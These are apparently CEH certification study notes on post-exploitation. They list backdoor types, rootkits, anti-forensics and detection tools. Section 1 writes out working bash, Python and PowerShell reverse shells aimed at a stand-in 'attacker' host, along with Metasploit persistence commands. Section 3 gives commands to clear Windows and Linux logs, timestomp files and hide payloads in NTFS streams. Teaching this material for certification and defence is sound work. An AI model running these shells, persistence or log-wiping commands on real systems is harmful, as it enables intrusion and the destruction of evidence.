# Unit 3: CEH — Topic 5: Maintaining Access and Covering Tracks

## Overview

After gaining initial access, attackers establish **persistence** (maintaining access) and then **cover their tracks** to avoid detection. These post-exploitation phases are critical CEH exam topics.

---

## 1. Backdoors and Trojans

```
BACKDOOR TYPES:

  Type             | Description           | Example
  Web shell        | PHP/ASP shell on server| c99, b374k
  Reverse shell    | Target connects to    | Netcat, Meterpreter
                   | attacker              |
  Bind shell       | Attacker connects to  | Netcat listener
                   | target port           |
  SSH backdoor     | Authorized key added  | .ssh/authorized_keys
  Registry backdoor| Windows auto-start    | Run/RunOnce keys
  Scheduled task   | Periodic execution    | cron, schtasks
  Service backdoor | Malicious service     | Windows service

REVERSE SHELL SETUP:
  # Attacker (listener):
  nc -lvnp 4444
  
  # Target (connect back):
  # Bash reverse shell:
  bash -i >& /dev/tcp/attacker/4444 0>&1
  
  # Python reverse shell:
  python -c 'import socket,os,subprocess;
  s=socket.socket();s.connect(("attacker",4444));
  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  
  # PowerShell reverse shell:
  powershell -nop -c "$c=New-Object System.Net.Sockets.
  TCPClient('attacker',4444);$s=$c.GetStream();
  [byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,
  $b.Length)) -ne 0){$d=(New-Object -TypeName 
  System.Text.ASCIIEncoding).GetString($b,0,$i);
  $r=(iex $d 2>&1|Out-String);$s.Write(
  ([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"

METASPLOIT PERSISTENCE:
  # Meterpreter persistence module
  run persistence -U -i 30 -p 4444 -r attacker_ip
  
  # Or use exploit/multi/handler for sessions
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST attacker_ip
  set LPORT 4444
  exploit
```

---

## 2. Rootkits

```
ROOTKIT TYPES:

  Level          | Description          | Detection
  Application    | Replace system bins  | File integrity
  Library        | Hook system libraries| Library checksums
  Kernel         | Modify kernel code   | Memory analysis
  Hypervisor     | Below OS level       | Very difficult
  Firmware/BIOS  | In hardware firmware | Nearly impossible
  Bootloader     | MBR/boot sector      | Secure boot

ROOTKIT CAPABILITIES:
  → Hide processes from task manager
  → Hide files from directory listings
  → Hide network connections
  → Intercept system calls
  → Capture keystrokes
  → Create hidden user accounts
  → Redirect network traffic

ROOTKIT DETECTION:
  → Compare trusted vs live system
  → Boot from clean media
  → File integrity monitoring
  → Memory forensics (Volatility)
  → Cross-view detection
  → Signature-based scanning
  
  Detection Tools:
  → GMER: Windows rootkit detector
  → chkrootkit: Linux checker
  → rkhunter: Linux rootkit hunter
  → Volatility: Memory analysis
  → OSSEC: File integrity monitoring

EXAM KEY POINTS:
  → Kernel rootkits are hardest to detect
  → Hypervisor rootkits run below the OS
  → Best detection: boot from clean media
  → Prevention: Secure Boot, UEFI
```

---

## 3. Covering Tracks

```
LOG MANIPULATION:

WINDOWS LOGS:
  → Event Viewer locations:
    - Application: Software events
    - Security: Login/logoff
    - System: Driver/service events
    - PowerShell: Script execution
  
  → Clear logs:
    wevtutil cl Security
    wevtutil cl System
    wevtutil cl Application
    
  → Or via Event Viewer GUI
  → Or PowerShell:
    Clear-EventLog -LogName Security

LINUX LOGS:
  → Log locations:
    /var/log/auth.log: Authentication
    /var/log/syslog: System events
    /var/log/apache2/: Web server
    /var/log/messages: General
    ~/.bash_history: Command history
    /var/log/wtmp: Login records
    /var/log/lastlog: Last logins
  
  → Clear logs:
    echo "" > /var/log/auth.log
    history -c && history -w
    shred -vfz /var/log/auth.log

TIMESTOMPING:
  → Modify file timestamps to blend in
  → Windows: timestomp (Meterpreter)
    timestomp file.exe -m "01/01/2020 12:00:00"
  → Linux: touch command
    touch -t 202001011200 file.txt
  → Anti-forensics technique

FILE HIDING:
  → Alternate Data Streams (Windows NTFS):
    type malware.exe > normal.txt:hidden.exe
    → Hidden in ADS, not visible normally
  → Hidden attributes (attrib +h)
  → Steganography: Hide in images
  → Encrypted containers: VeraCrypt
```

---

## 4. Anti-Forensics Techniques

```
ANTI-FORENSICS:

DATA DESTRUCTION:
  → Secure file deletion (shred, sdelete)
  → Disk wiping (DBAN)
  → Crypto-shredding: Destroy encryption key
  → Physical destruction

ARTIFACT MANIPULATION:
  → Registry cleaning
  → Browser history deletion
  → Prefetch file removal
  → Thumbnail cache clearing
  → USB artifact removal

ENCRYPTION:
  → Full disk encryption
  → Encrypted communications
  → Encrypted containers
  → Plausible deniability (hidden volumes)

NETWORK ANTI-FORENSICS:
  → VPN usage
  → Tor/anonymization
  → Encrypted protocols
  → DNS over HTTPS
  → Traffic padding
  → MAC spoofing

EXAM TOPICS:
  → Know log locations (Windows + Linux)
  → Know how to clear logs
  → Understand timestomping
  → Know ADS (Alternate Data Streams)
  → Understand steganography
  → Know anti-forensics categories
```

---

## 5. Detection and Prevention

```
DETECTING PERSISTENT ACCESS:

INDICATORS OF COMPROMISE:
  → Unknown scheduled tasks/cron jobs
  → Unfamiliar services/processes
  → Modified system files
  → Unexpected network connections
  → Registry autostart entries
  → New user accounts
  → Modified access control lists
  → Unusual outbound traffic

DETECTION TOOLS:
  Tool            | Purpose
  Autoruns        | Windows autostart entries
  Process Explorer| Running processes
  TCPView         | Network connections
  Volatility      | Memory forensics
  OSSEC           | File integrity
  Sysmon          | Windows event monitoring
  osquery         | System state queries

PREVENTION:
  → File integrity monitoring (FIM)
  → Endpoint Detection and Response (EDR)
  → Application whitelisting
  → Behavioral analysis
  → Regular security audits
  → Log centralization (SIEM)
  → Network traffic analysis
  → Honeypots/honeytokens

EXAM FOCUS:
  → Maintaining access = persistence
  → Covering tracks = anti-forensics
  → Know tools for both sides (attack/defense)
  → Understand detection methods
```

---

## Summary Table

| Technique | Category | Key Tools |
|-----------|----------|----------|
| Backdoors | Maintaining Access | Netcat, Meterpreter |
| Rootkits | Maintaining Access | Custom kernel modules |
| Log Clearing | Covering Tracks | wevtutil, shred |
| Timestomping | Covering Tracks | timestomp, touch |
| ADS | Covering Tracks | NTFS feature |
| Anti-forensics | Covering Tracks | Encryption, wiping |

---

## Revision Questions

1. What is the difference between a bind shell and a reverse shell?
2. Why are kernel-level rootkits harder to detect than application-level?
3. What are Alternate Data Streams and how are they used to hide data?
4. What Windows command clears the Security event log?
5. What tools can detect persistent backdoor mechanisms?

---

*Previous: [04-exploitation-domains.md](04-exploitation-domains.md) | Next: [06-study-resources.md](06-study-resources.md)*

---

*[Back to README](../README.md)*
